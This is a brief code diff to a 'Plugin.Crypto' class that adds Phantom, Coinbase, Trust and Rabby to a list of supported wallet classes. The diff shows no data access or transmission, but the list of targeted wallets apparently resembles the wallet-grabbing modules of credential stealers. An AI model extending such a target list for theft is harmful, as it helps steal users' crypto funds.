@@ -12,12 +12,18 @@ namespace Plugin.Crypto
         {
             wallets = new List<CryptoWalletBase>
             {
+                // Original wallets (2021)
                 new ElectrumWallet(),
                 new MetamaskWallet(),
                 new ExodusWallet(),
                 new BitcoinCoreWallet(),
                 new EthereumWallet(),
-                new AtomicWallet()
+                new AtomicWallet(),
+                // New popular wallets (2025)
+                new PhantomWallet(),
+                new CoinbaseWallet(),
+                new TrustWallet(),
+                new RabbyWallet()
             };
         }
         
